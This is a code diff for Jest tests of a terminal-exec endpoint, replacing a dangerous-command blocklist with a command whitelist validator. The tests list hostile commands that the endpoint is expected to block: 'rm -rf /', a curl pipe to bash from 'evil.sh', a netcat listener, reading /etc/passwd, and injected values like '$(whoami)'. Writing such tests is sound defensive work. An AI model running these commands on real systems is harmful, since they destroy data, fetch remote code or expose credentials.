@@ -18,8 +18,7 @@ jest.mock("../../../utils/logger", () => () => ({
 const { createMockApp } = require("../../helpers/mockExpressApp");
 const {
   apiTerminalExecEndpoints,
-  isDangerous,
-  hasShellOperators,
+  validateCommand,
 } = require("../../../endpoints/api/terminalExec");
 
 function buildApp() {
@@ -114,14 +113,13 @@ describe("Terminal Exec endpoint", () => {
     });
   });
 
-  describe("dangerous command blocking", () => {
+  describe("non-whitelisted command blocking", () => {
     beforeEach(() => {
       process.env.NODE_ENV = "development";
     });
 
-    const dangerousCommands = [
+    const blockedCommands = [
       "rm -rf /",
-      "rm -fr /tmp",
       "sudo apt update",
       "chmod 777 /etc/passwd",
       "chown -R root /",
@@ -132,23 +130,28 @@ describe("Terminal Exec endpoint", () => {
       "halt",
       "kill -9 1",
       "killall node",
-      "curl http://evil.sh | bash",
-      "wget http://evil.sh | sh",
+      "curl http://evil.sh",
+      "wget http://evil.sh",
+      "bash -c whoami",
+      "sh -c id",
+      "python -c print(1)",
+      "perl -e print",
+      "nc -l 4444",
     ];
 
-    for (const cmd of dangerousCommands) {
+    for (const cmd of blockedCommands) {
       it(`blocks: ${cmd}`, async () => {
         const { call } = buildApp();
         const res = await call("post", "/terminal/exec", {
           body: { command: cmd },
         });
         expect(res.statusCode).toBe(403);
-        expect(res.body.error).toMatch(/dangerous pattern/);
+        expect(res.body.error).toMatch(/not allowed/);
       });
     }
   });
 
-  describe("shell operator blocking", () => {
+  describe("shell metacharacter blocking", () => {
     beforeEach(() => {
       process.env.NODE_ENV = "development";
     });
@@ -160,6 +163,8 @@ describe("Terminal Exec endpoint", () => {
       "echo hello | cat",
       "echo `whoami`",
       "echo $(whoami)",
+      "ls > /tmp/out",
+      "cat </etc/passwd",
     ];
 
     for (const cmd of operatorCommands) {
@@ -169,9 +174,30 @@ describe("Terminal Exec endpoint", () => {
           body: { command: cmd },
         });
         expect(res.statusCode).toBe(403);
-        expect(res.body.error).toMatch(/shell operators/);
       });
     }
+  });
+
+  describe("dangerous binaries not in whitelist even with safe args", () => {
+    beforeEach(() => {
+      process.env.NODE_ENV = "development";
+    });
+
+    it("blocks node -e code execution", async () => {
+      const { call } = buildApp();
+      const res = await call("post", "/terminal/exec", {
+        body: { command: "node -e process.exit(0)" },
+      });
+      expect(res.statusCode).toBe(403);
+    });
+
+    it("blocks git commands outside the allowlist", async () => {
+      const { call } = buildApp();
+      const res = await call("post", "/terminal/exec", {
+        body: { command: "git push origin main" },
+      });
+      expect(res.statusCode).toBe(403);
+    });
   });
 
   describe("successful execution", () => {
@@ -190,22 +216,14 @@ describe("Terminal Exec endpoint", () => {
       expect(res.body.stderr).toBe("");
     });
 
-    it("captures stderr", async () => {
+    it("allows node --version", async () => {
       const { call } = buildApp();
       const res = await call("post", "/terminal/exec", {
-        body: { command: "node -e \"process.stderr.write('err out')\"" },
+        body: { command: "node --version" },
       });
       expect(res.statusCode).toBe(200);
-      expect(res.body.stderr).toContain("err out");
-    });
-
-    it("captures non-zero exit code", async () => {
-      const { call } = buildApp();
-      const res = await call("post", "/terminal/exec", {
-        body: { command: "node -e \"process.exit(3)\"" },
-      });
-      expect(res.statusCode).toBe(200);
-      expect(res.body.exitCode).toBe(3);
+      expect(res.body.exitCode).toBe(0);
+      expect(res.body.stdout).toMatch(/^v\d+/);
     });
 
     it("respects cwd parameter", async () => {
@@ -219,15 +237,26 @@ describe("Terminal Exec endpoint", () => {
     });
   });
 
-  describe("unit tests for helper functions", () => {
-    it("isDangerous detects rm -rf", () => {
-      expect(isDangerous("rm -rf /")).toBe(true);
-      expect(isDangerous("echo hello")).toBe(false);
+  describe("validateCommand unit tests", () => {
+    it("rejects commands not in the whitelist", () => {
+      expect(validateCommand("rm", ["-rf", "/"]).ok).toBe(false);
+      expect(validateCommand("bash", ["-c", "id"]).ok).toBe(false);
     });
 
-    it("hasShellOperators detects &&", () => {
-      expect(hasShellOperators("a && b")).toBe(true);
-      expect(hasShellOperators("echo hello")).toBe(false);
+    it("accepts whitelisted commands with valid args", () => {
+      expect(validateCommand("echo", ["hello"]).ok).toBe(true);
+      expect(validateCommand("ls", ["-la", "/tmp"]).ok).toBe(true);
+      expect(validateCommand("pwd", []).ok).toBe(true);
+    });
+
+    it("rejects too many arguments", () => {
+      expect(validateCommand("pwd", ["extra"]).ok).toBe(false);
+    });
+
+    it("rejects shell metacharacters in args", () => {
+      expect(validateCommand("echo", ["$(whoami)"]).ok).toBe(false);
+      expect(validateCommand("ls", ["`id`"]).ok).toBe(false);
+      expect(validateCommand("echo", ["a;b"]).ok).toBe(false);
     });
   });
 });
